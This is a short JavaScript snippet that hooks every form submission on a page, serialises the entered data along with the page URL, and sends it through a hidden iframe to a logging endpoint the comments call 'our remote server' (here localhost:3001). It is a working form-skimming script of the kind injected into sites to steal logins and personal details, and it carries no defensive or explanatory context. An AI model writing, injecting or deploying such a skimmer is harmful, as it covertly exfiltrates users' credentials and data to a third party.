
// use an iframe element to make an GET HTTP request
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

function send(data) {
	// add the current web pages URL to the outgoiing data
	data += "&url=" + encodeURIComponent(window.location.href);

	// set the iframes src attribute to our remote server
	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
}

$('form').submit(function() {
	send($(this).serialize());
});
